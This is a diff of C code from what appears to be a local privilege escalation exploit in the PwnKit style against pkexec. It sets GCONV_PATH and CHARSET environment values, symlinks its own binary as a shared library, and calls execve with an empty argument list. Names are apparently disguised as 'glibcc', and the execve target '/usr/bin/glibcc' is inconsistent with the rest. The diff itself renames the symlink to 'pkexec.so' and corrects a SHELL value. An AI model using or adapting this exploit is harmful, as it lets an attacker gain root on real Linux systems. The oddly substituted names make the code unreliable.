@@ -79,7 +79,7 @@ void entry()
     fclose(fp);
 
     buf[readlink("/proc/self/exe", buf, sizeof(buf))] = 0;
-    res = symlink(buf, ".glibcc/glibcc.so");
+    res = symlink(buf, ".glibcc/pkexec.so");
     if (res == -1)
     {
         perror("Failed to copy file");
@@ -113,7 +113,7 @@ void entry()
         cmd = memcpy(argv[1]-4, "CMD=", 4);
     }
     char *args[] = {NULL};
-    char *env[] = {".glibcc", "PATH=GCONV_PATH=.", "CHARSET=glibcc", "SHELL=glibccc", cmd, NULL};
+    char *env[] = {".glibcc", "PATH=GCONV_PATH=.", "CHARSET=glibcc", "SHELL=glibcc", cmd, NULL};
     execve("/usr/bin/glibcc", args, env);
 
     // In case glibcc is not in /usr/bin/
